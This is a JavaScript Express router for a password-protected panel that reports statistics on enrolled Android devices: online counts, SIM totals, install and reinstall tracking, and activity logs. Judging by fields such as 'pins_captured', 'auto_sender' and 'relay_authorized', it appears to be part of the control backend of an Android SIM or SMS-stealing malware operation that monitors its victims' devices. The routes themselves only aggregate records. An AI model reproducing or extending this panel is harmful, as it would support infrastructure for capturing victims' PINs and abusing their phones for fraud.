"use strict";

const express = require("express");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const auth = require("../auth");
const relay = require("../relay");
const { outboxCounters } = require("../routes/devices");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

const HOUR = 3600000;
const DAY = 86400000;

async function reinstallsCount() {
  try {
    const agg = await db.install_fingerprints
      .aggregate([{ $group: { _id: null, n: { $sum: { $subtract: [{ $ifNull: ["$install_count", 1] }, 1] } } } }])
      .toArray();
    return agg.length ? parseInt(agg[0].n || 0, 10) : 0;
  } catch (_) {
    return 0;
  }
}

router.get("/overview", ah(async (req, res) => {
  await auth.requirePanel(req);

  const now = Date.now();
  const count = (q) => db.devices.countDocuments(q).catch(() => 0);

  const [total, active, gone, uninstalled, onboarded, autoSender, keys] = await Promise.all([
    count({}),
    count({ last_seen: { $gte: new Date(now - config.ONLINE_WINDOW_SECONDS * 1000) } }),
    count({ install_state: "gone" }),
    count({ last_seen: { $lt: new Date(now - config.STALE_AFTER_DAYS * DAY) } }),
    count({ onboarded: true }),
    count({ "auto_sender.enabled": true }),
    db.panel_keys.countDocuments({}).catch(() => 0),
  ]);

  let sims = 0;
  try {
    for await (const d of db.devices.find({}, { projection: { sim_count: 1, "telemetry.sims": 1 } })) {
      sims += d.sim_count || ((d.telemetry || {}).sims || []).length;
    }
  } catch (_) {}

  res.json({
    total_devices: total,
    active_devices: active,
    offline_devices: Math.max(0, total - active),
    total_sims: sims,
    pins_captured: onboarded,
    online_sockets: require("../hub").hub.onlineCount,
    auto_sender_enabled: autoSender,
    relay_authorized: !!relay.relayState.authorized,
    panel_keys: keys,
    installs_total: total,
    live_now: active,
    uninstalled,
    replaced: gone,
    reinstalls: await reinstallsCount(),
  });
}));

router.get("/stats", ah(async (req, res) => {
  await auth.requirePanel(req);

  const now = Date.now();
  const liveCut = new Date(now - config.ONLINE_WINDOW_SECONDS * 1000);
  const idleCut = new Date(now - config.IDLE_AFTER_HOURS * HOUR);
  const staleCut = new Date(now - config.STALE_AFTER_DAYS * DAY);

  const count = (q) => db.devices.countDocuments(q).catch(() => 0);
  const events = (ev, since) => {
    const q = { event: ev };
    if (since) q.created_at = { $gte: since };
    return db.device_events.countDocuments(q).catch(() => 0);
  };

  const dayAgo = new Date(now - DAY);
  const weekAgo = new Date(now - 7 * DAY);

  const [total, live, idle, stale, uninstalled, gone, onboarded] = await Promise.all([
    count({}),
    count({ last_seen: { $gte: liveCut } }),
    count({ last_seen: { $lt: liveCut, $gte: idleCut } }),
    count({ last_seen: { $lt: idleCut, $gte: staleCut } }),
    count({ last_seen: { $lt: staleCut } }),
    count({ install_state: "gone" }),
    count({ onboarded: true }),
  ]);

  let uniqueDevices = 0;
  try {
    uniqueDevices = (await db.devices.distinct("android_id", { android_id: { $nin: [null, ""] } })).length;
  } catch (_) {}

  const [inst24, inst7d, updTotal, upd7d] = await Promise.all([
    events("install", dayAgo),
    events("install", weekAgo),
    events("update"),
    events("update", weekAgo),
  ]);

  res.json({
    installs_total: total,
    unique_devices: uniqueDevices,
    reinstalls: await reinstallsCount(),
    install_events_24h: inst24,
    install_events_7d: inst7d,
    updates_total: updTotal,
    updates_7d: upd7d,
    live,
    idle,
    stale,
    uninstalled,
    replaced: gone,
    onboarded,
    retention_pct: total ? Math.round((1000 * live) / total) / 10 : 0,
    uninstall_rate_pct: total ? Math.round((1000 * uninstalled) / total) / 10 : 0,
    outbox: await outboxCounters(),
    generated_at: new Date(now).toISOString(),
  });
}));

router.get("/growth/events", ah(async (req, res) => {
  await auth.requirePanel(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 80, 10), 300));

  const rows = await db.device_events.find().sort({ _id: -1 }).limit(limit).toArray();

  // N+1 fix: ek hi query me saare devices
  const ids = [];
  for (const r of rows) {
    if (r.device_id) {
      try {
        ids.push(new db.ObjectId(String(r.device_id)));
      } catch (_) {}
    }
  }

  const map = new Map();
  if (ids.length) {
    const docs = await db.devices
      .find({ _id: { $in: ids } }, { projection: { short_id: 1, device_name: 1 } })
      .toArray()
      .catch(() => []);
    for (const d of docs) map.set(String(d._id), d);
  }

  const out = rows.map((r) => {
    const d = map.get(String(r.device_id || "")) || null;
    return {
      id: String(r._id),
      event: r.event,
      short_id: (d && d.short_id) || "—",
      device_name: r.device_name || (d && d.device_name) || "Unknown",
      app_version: r.app_version || "",
      android_id: (r.android_id || "").slice(0, 12),
      ts: u.serializeDt(r.created_at),
    };
  });

  res.json({ events: out });
}));

router.get("/growth/activity", ah(async (req, res) => {
  await auth.requirePanel(req);
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 100, 10), 500));
  const rows = await db.activity_logs.find().sort({ _id: -1 }).limit(limit).toArray();
  res.json({ activity: rows.map(u.serializeDocument) });
}));

module.exports = router;